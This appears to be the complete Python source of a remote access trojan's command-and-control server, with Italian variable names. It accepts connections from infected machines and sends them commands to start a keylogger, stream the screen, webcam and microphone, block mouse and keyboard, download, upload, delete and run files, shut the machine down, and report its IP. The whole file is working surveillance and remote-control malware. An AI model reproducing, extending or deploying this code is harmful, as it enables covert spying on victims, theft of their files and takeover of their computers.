import socket
import os
import sys
import time
import pickle
from colorama import *
import subprocess
import string
import tkinter as tk
import threading
from PIL import Image , ImageTk
import cv2
import random
import numpy as np
import select
from ratelimit import sleep_and_retry , limits
import matplotlib.pyplot as plt


ip = "IP"
port = "PORT"

initliaze = lambda obj , x_coord , y_coord: obj.place(x=x_coord , y=y_coord)



########################## Flags ##########################
SCREENSHARE_FLAG = False
SOUNDBOARD_FLAG = False
CAMERA_FLAG = False
###########################################################

########################## Environment ##########################

try:
    Soundboard_path = os.path.join(os.path.dirname(sys.argv[0]) , "server Modules" , "SoundBoard")
    os.makedirs(os.path.join(os.path.dirname(sys.argv[0]) , "server Modules" , "SoundBoard"))
except FileExistsError:
    pass
except:
    raise Exception("Modules not found")

#################################################################

def recieve_file(client , arg , autorun):
        global target
        file_data = b""
        client.sendall(pickle.dumps(create_header(prefix , arg , None , None)))
        iters = client.recv(4096)
        if type(pickle.loads(iters)) == dict:
            error_to_info(pickle.loads(iters)["response"])
        else:
            for n in range(pickle.loads(iters)):
                client.sendall(b"ok")
                pezzo = client.recv(1000000)
                file_data = file_data + pezzo
            os.chdir(target)
            nome = arg.split("\\")[-1]
            print(Fore.GREEN + f'{nome} has been downloaded succesfully!')
            print(Fore.GREEN + f"Destination target is set to {target}, to change it, use '$changetarget' followed by the desired folder")
            with open(nome , "wb") as file:
                file.write(file_data)
            file.close()
            if autorun:
                os.startfile(os.path.join(target , nome))

def sendfile(argument , auto_open , client):
    if auto_open == False:
        mode = input("Would you like to open it at the end of download?: ")
    elif auto_open == True:
        mode = "Y"
    elif auto_open == None:
        mode = "N"
    elif auto_open == "Sound":
        mode = "Sound"
    if mode in ["Y" , "N" , "Sound"]:
        chunks = []
        chunksize = 1000000  
        nome = argument.split("\\")[-1]      
        try:
            datafile = getdata(rf"{argument}")
            chunk_string(datafile , chunksize , chunks)
            iters = len(chunks)
            print(iters)
            client.sendall(pickle.dumps(create_header(prefix , nome , iters , mode)))
            chunknumber = 0
            for n in range(iters):
                status = client.recv(1024)
                client.sendall(chunks[chunknumber])
                chunknumber += 1
            print("done!")
        except PermissionError:
            error_to_info("Error 2")
        except FileNotFoundError:
            error_to_info("Error 1")
        except:
            error_to_info("Error -1")
            raise
    else:
        error_to_info("Error 3")

button_s = True

stream_y_points = []
stream_x_points = []


def screenshare(screenshare_ip , stream_channel , conn_id):
    global stream_x_points , stream_y_points
    global total_connections
    global current_array
    share_mutex = random.randint(0 , 99999999)
    print(total_connections[conn_id]["screenshare_flag"])
    stream_x_points.clear()
    stream_y_points.clear()

    iters = 0

    prev_t = 0

    timedout = False

    CONSTANT_RX_VALUE = 500000

    def measure():
        global stream_channel
        old_iters = 0
        while True:
            frames = iters - old_iters
            old_iters = iters
            time.sleep(1.0)
            if stream_channel == False:
                break



    while True:
        if total_connections[conn_id]["screenshare_flag"] == False:
            break
        print("starting")
        tempo = 5
        threading.Thread(target=measure).start()
        while True:
            try:
                cv2.namedWindow(f"screenshare {screenshare_ip} , ID: {share_mutex}" , cv2.WINDOW_NORMAL)
                cv2.resizeWindow(f"screenshare {screenshare_ip} , ID: {share_mutex}" , 900 , 700)
                break
            except Exception as ex:
                time.sleep(3.0)
                print("retrying...")
        while cv2.getWindowProperty(f"screenshare {screenshare_ip} , ID: {share_mutex}", cv2.WND_PROP_VISIBLE) >= 1:
            try:
                start_time = time.time()
                buffer = b""
                stream_channel.sendall(b"ok")
                lunghezza = pickle.loads(stream_channel.recv(1024))
                while len(buffer) != lunghezza and timedout == False:
                    stream_channel.sendall(b"ok") 
                    pezzo = stream_channel.recv(CONSTANT_RX_VALUE)
                    buffer += pezzo
                screen = cv2.imdecode(pickle.loads(buffer) , cv2.IMREAD_COLOR)
                cv2.imshow(f"screenshare {screenshare_ip} , ID: {share_mutex}" , screen)
                cv2.waitKey(1)
                stop_time = time.time()
                prev_t += stop_time - start_time
                stream_x_points.append(prev_t)
                stream_y_points.append(lunghezza) 
                iters += 1
            except:
                cv2.destroyWindow(f"screenshare {screenshare_ip} , ID: {share_mutex}")
                break
        total_connections[conn_id]["screenshare_flag"] = False
        total_connections[conn_id]["client"].sendall(pickle.dumps(create_header("$stopstream", None , None , None)))
    

def reg_vol(blocco_audio , val):
    return (np.frombuffer(blocco_audio , np.int16) * val).astype(np.int16).tobytes()

def mic_brains(mic_channel , conn_id):
    import pyaudio
    p = pyaudio.PyAudio()
    canale_output = p.open(format=pyaudio.paInt16 , channels= 1 , output = True , rate= 44100)
    while total_connections[conn_id]["mic_flag"] == True:
        pezzo = mic_channel.recv(10000)
        print(len(pezzo))
        canale_output.write(reg_vol(pickle.loads(pezzo) , 5))
    

def camera_share(camera_ip , camera_channel , conn_id):
    global total_connections

    camera_mutex = random.randint(0 , 99999999)
    iters = 0
    timedout = False
    CONSTANT_RX_VALUE = 500000

    def measure():
        global camera_channel
        old_iters = 0
        while True:
            frames = iters - old_iters
            old_iters = iters
            time.sleep(1.0)
            if camera_channel == False:
                break

    while True:
        if total_connections[conn_id]["camera_flag"] == False:
            break
        print("starting")
        tempo = 5
        threading.Thread(target=measure).start()
        while True:
            try:
                cv2.namedWindow(f"camera {camera_ip} , ID: {camera_mutex}" , cv2.WINDOW_NORMAL)
                cv2.resizeWindow(f"camera {camera_ip} , ID: {camera_mutex}" , 900 , 700)
                break
            except Exception as ex:
                time.sleep(3.0)
                print("retrying...")
        while cv2.getWindowProperty(f"camera {camera_ip} , ID: {camera_mutex}", cv2.WND_PROP_VISIBLE) >= 1:
            try:
                if total_connections[conn_id]["camera_flag"] == False:
                    raise
                buffer = b""
                camera_channel.sendall(b"ok")
                lunghezza = pickle.loads(camera_channel.recv(1024))
                while len(buffer) != lunghezza and timedout == False:
                    camera_channel.sendall(b"ok")
                    pezzo = camera_channel.recv(CONSTANT_RX_VALUE)
                    buffer += pezzo
                screen = cv2.imdecode(pickle.loads(buffer) , cv2.IMREAD_COLOR)
                cv2.imshow(f"camera {camera_ip} , ID: {camera_mutex}" , cv2.flip(screen , 1))
                cv2.waitKey(1)
                iters += 1
            except:
                cv2.destroyWindow(f"camera {camera_ip} , ID: {camera_mutex}")
                break
        total_connections[conn_id]["camera_flag"] = False
        total_connections[conn_id]["client"].sendall(pickle.dumps(create_header("$stopcamera", None , None , None)))

def soundboard_brains(client , prefix , path):
    global button_s
    if button_s:
        button_s = False
        client.sendall(pickle.dumps(create_header(prefix , None , None , None)))
        sendfile(path , "Sound" , client)
        button_s = True
        


def soundboard_gui(client , prefix):
    global SOUNDBOARD_FLAG , button_s
    y = 86
    x = 86
    num = 0
    soundnum = 1
    audios = os.listdir(Soundboard_path)
    if SOUNDBOARD_FLAG == False:
        SOUNDBOARD_FLAG = True
        while True:
            window = tk.Tk()
            
            window.title("soundboard")
            window.geometry("860x700")
            window.configure(bg = "black")
            exit_b = tk.Button(window , text="Exit" , bg="black" , fg="white" , width=7 , command= lambda: close(window))
            initliaze(exit_b , 100 , 20)
            text = tk.Label(window , text="Soundboard" , bg="black" , fg="white")
            text.config(font=('Terminal', 26))
            initliaze(text , 320 , 19)
            if button_s == True:
                for ele in audios:
                    path_to_ele = os.path.join(Soundboard_path , ele)
                    if ele.split("//")[-1].endswith(".mp3") or ele.split("//")[-1].endswith(".ogg"):
                        print(ele)
                        button = tk.Button(width=10 ,text = ele.split("//")[-1].split(" ")[0] , command = lambda path_to_ele = path_to_ele: soundboard_brains(client , prefix , path_to_ele))
                        initliaze(button , x ,y)
                        soundnum += 1
                        num += 1
                        y += 34
                        if num%15 == 0: #ogni 15 pulsanti creati resetta altezza di base a 86 pixel e avanza di 150 pixel
                            x += 150
                            y = 86

                window.mainloop()
                SOUNDBOARD_FLAG = False
                break
    else:
        print(Fore.YELLOW + "Warning: Soundboard is already running")


def close(window):
    try:
        window.destroy()
    except:
        pass

def getdata(file):
    f = open(file , "rb")
    data = f.read()
    return data


def create_header(first , second , third , fourth ):
    header = {
        "prefix": first ,
        "object": second ,
        "flag": third ,
        "mode": fourth
    }
    return header

    
def chunk_string(input_string, chunk_size , lista):
    lista.extend([input_string[i:i + chunk_size] for i in range(0, len(input_string), chunk_size)])

def error_to_info(Error):
    Error_code = Error.split(" ")[1]
    if Error_code == "0":
        print(Fore.RED + "No such command")
    if Error_code == "1":
        print(Fore.RED + "No such path")
    if Error_code == "2":
        print(Fore.RED + "Permission error")
    if Error_code == "3":
        print(Fore.RED + "No such argument")
    if Error_code == "-1":
        print(Fore.RED + "Unhandeled exception")




one_a_commands = ["$dir" , "$del" , "$shutdown" , "$restart" , "$get" , "$run" , "$changetarget" , "$send" , "$change_client"]
zero_a_commands = ["$stopmic" , "$startmic" , "$getip" , "$test" , "$netstat" , "$blockmouse" , "$unblockmouse" , "$startkeylogger" , "$stopkeylogger" , "$blockkeyboard" , "$unblockkeyboard" , "$startstream" , "$stopstream" , "$soundboard" , "$startcamera" , "$clients" , "$stopcamera"]

ratpath = r"C:\Users\Mio_PC\Desktop\Nuova cartella (7)"
try:
    os.chdir(ratpath)
    os.makedirs(name = "Outputs")
except FileExistsError:
    pass

target = os.path.join(ratpath , "Outputs")



total_connections = []

addrs = []
ever_done = False
busy = False
current_connection = None




def initialize_clients(thing):
    global current_connection
    while True:
        hb_mutex = None
        stream_mutex = None
        camera_mutex = None
        client_mutex = None
        mic_mutex = None
        try:

            thing.listen()
            thing.settimeout(3.5)
            while client_mutex != "$client":
                client, client_addr = thing.accept()
                client_mutex = pickle.loads(client.recv(100))
                if client_mutex != "$client":
                    client.close()
            
            client.sendall(b"auth")


            while hb_mutex != "$hb":
                hb_type, hb_addr = thing.accept()
                hb_mutex = pickle.loads(hb_type.recv(100))
                if hb_mutex != "$hb":
                    hb_type.close()
                

            while stream_mutex != "$stream":
                stream_type, stream_addr = thing.accept()
                stream_mutex = pickle.loads(stream_type.recv(100))
                if stream_mutex != "$stream":
                    stream_type.close()

            
            while camera_mutex != "$camera":
                camera_type, camera_addr = thing.accept()
                camera_mutex = pickle.loads(camera_type.recv(100))
                if camera_mutex != "$camera":
                    camera_type.close()

            while mic_mutex != "$mic_audio":
                mic_type , mic_addr = thing.accept()
                mic_mutex = pickle.loads(mic_type.recv(100))
                if mic_mutex != "$mic_audio":
                    mic_type.close()

            print(Fore.GREEN + f"Got new Connection! {client_addr}")
            client_assembly = {
                "screenshare_flag": False,
                "camera_flag": False,
                "mic_flag": False,
                "ip": client_addr,
                "client": client,
                "heartbeat": hb_type,
                "stream": stream_type,
                "camera": camera_type,
                "mic_audio": mic_type
                
            }
            current_connection = client_assembly["client"]
            total_connections.append(client_assembly)
        except:
            pass

current_array = None

def currentconn():
    global connessione
    global current_array
    while True:
        try:
            if len(total_connections) > 0:
                for n in total_connections:
                    if n["client"] == connessione:
                        current_array = n
                    else:
                        pass
                    time.sleep(0.1)
        except:
            pass
                    
            



def pinger():
    global current_connection
    global connessione
    while True:
        for n in total_connections:
            try:
                n["heartbeat"].send(b"ping")
                n["heartbeat"].recv(10)
                time.sleep(1.0)
            except:
                print(Fore.RED + f"{n['ip']} has disconnected!" + Style.RESET_ALL)
                total_connections.remove(n)
                if connessione == n["client"] and len(total_connections) > 0:
                    connessione = random.choice(total_connections)["client"]
                    current_connection = connessione
                    print(Fore.GREEN + f"Target connection assigned to {connessione}")

threading.Thread(target=pinger).start()
threading.Thread(target=currentconn).start()


while True:
    print(Fore.YELLOW + "WARNING!: When a client disconnects and reconnects when you're inputting a command, it will result in an error message. Just re-send the command")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as master:
        master.bind((ip, port))
        threading.Thread(target=initialize_clients , args = [master,]).start()
        print(Fore.WHITE + "Listening...")

        while True:
            if current_connection != None:
                connessione = current_connection
                ever_done = True
                break
            else:
                pass
        while True:
            if connessione:
                while True:
                    operation = input(Fore.WHITE + "")
                    try:
                        #one argument
                        splitted = operation.split(" " , 1)
                        if splitted[0] in one_a_commands:
                            prefix = splitted[0]
                            if len(splitted) < 2:
                                print(f"{prefix} takes one argument, but 0 were given")
                            elif len(splitted) == 2:
                                arg = splitted[1]

                                if prefix == "$dir":
                                    connessione.sendall(pickle.dumps(create_header(prefix , arg , None , None)))
                                    data = connessione.recv(1000000)
                                    header = pickle.loads(data)
                                    if header["response"].startswith("Error"):
                                        error_to_info(header["response"])
                                    else:
                                        print(header["response"])

                                if prefix == "$run":
                                    connessione.sendall(pickle.dumps(create_header(prefix , arg , None , None)))
                                    header = pickle.loads(connessione.recv(1024))
                                    print(header["response"])
                                    if header["response"].startswith("Error"):
                                        error_to_info(header["response"])
                                    else:
                                        print(header["response"])

                                if prefix == "$del":
                                    connessione.sendall(pickle.dumps(create_header(prefix , arg , None , None)))
                                    data = connessione.recv(1000000)
                                    header = pickle.loads(data)
                                    if header["response"].startswith("Error"):
                                        error_to_info(header["response"])
                                    else:
                                        print(header["response"])
                                    

                                if prefix == "$shutdown":
                                    if int(arg) == 1 or int(arg) == 2:
                                        connessione.sendall(pickle.dumps(create_header(prefix , None , None , arg)))
                                    else:
                                        error_to_info("Error 3")
                                

                                if prefix == "$changetarget":
                                    try:
                                        os.chdir(arg)
                                        target = arg
                                    except FileNotFoundError:
                                        print(error_to_info("Error 0"))
                                    except PermissionError:
                                        print(error_to_info("Error 2"))
                                        

                                if prefix == "$get":
                                    recieve_file(connessione , arg , False)
                                    
                                if prefix == "$send":
                                    sendfile(arg , False , connessione)

                                if prefix == "$change_client":
                                    connessione = total_connections[int(arg) - 1]["client"]  

                        #zero arguments
                        elif splitted[0] in zero_a_commands:
                                prefix = splitted[0]
                                if prefix == "$getip":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    header = pickle.loads(connessione.recv(4096))
                                    IP = header["response"]
                                    PrIP = header["response2"]
                                    print(f"Public IP: {IP}") 
                                    print(f"Private IP: {PrIP}")      

                                if prefix == "$netstat":
                                    recieve_file(connessione , "netstat.txt" , True)
                        
                                if prefix == "$blockmouse":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    mousestatus = pickle.loads(connessione.recv(4096))

                                if prefix == "$unblockmouse":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    mousestatus = pickle.loads(connessione.recv(4096))

                                if prefix == "$blockkeyboard":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    mousestatus = pickle.loads(connessione.recv(4096))

                                if prefix == "$unblockkeyboard":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    mousestatus = pickle.loads(connessione.recv(4096))

                                if prefix == "$startkeylogger":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                
                                if prefix == "$stopkeylogger":
                                    connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    print(pickle.loads(connessione.recv(4096)))

                                if prefix == "$startstream":
                                    if current_array["screenshare_flag"] == False:
                                        time.sleep(1.5)
                                        stream_channel = current_array["stream"]
                                        current_array["screenshare_flag"] = True
                                        threading.Thread(target=screenshare , args=[current_array["ip"], stream_channel , total_connections.index(current_array),]).start()
                                        connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                    else:
                                        print("Screenshare is already running!")    

                                if prefix == "$startcamera":
                                    if current_array["camera_flag"] == False:
                                        time.sleep(1.5)
                                        connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                        current_array["camera_flag"] = True
                                        camera_channel = current_array["camera"]
                                        threading.Thread(target=camera_share , args=[current_array["ip"], camera_channel , total_connections.index(current_array),]).start()
                                    else:
                                        print("Screenshare is already running!")

                                if prefix == "$startmic":
                                    if current_array["mic_flag"] == False:
                                        connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                        current_array["mic_flag"] = True
                                        mic_channel = current_array["mic_audio"]
                                        threading.Thread(target=mic_brains , args=[mic_channel , total_connections.index(current_array),]).start()
                                    else:
                                        print("Mic is already running")

                                if prefix == "$stopmic":
                                    if current_array["mic_flag"] == True:
                                        connessione.sendall(pickle.dumps(create_header(prefix , None , None , None)))
                                        current_array["mic_flag"] = False
                                    else:
                                        print("no mic instance running in this client")


                                if prefix == "$soundboard":
                                    threading.Thread(target = soundboard_gui , args=[connessione, prefix,]).start()

                                if prefix == "$clients":
                                    for n in total_connections:
                                        print(f"[{total_connections.index(n) + 1}] IP: {str(n['ip']).split(',')[0].strip('(').strip(')')} , PORT: {str(n['ip']).split(',')[1].strip('(').strip(')')} ")

                                if prefix == "$test":
                                    plt.plot(stream_x_points , stream_y_points , linestyle = "-", )
                                    plt.title("distribuzione della grandezza dei pacchetti nel tempo")
                                    plt.ylabel("grandezza")
                                    plt.xlabel("tempo")
                                    plt.show()
                                

                        else:
                            print(error_to_info("Error 0")) 
                    except Exception as e:
                        raise
                        current_connection = None
                        try:
                            connessione = random.choice(total_connections)["client"]
                        except:
                            if len(total_connections) == 0:
                                print(Fore.RED + "No clients connected!")
                                break
                            else:
                                print(e)
                                print("error!")



            
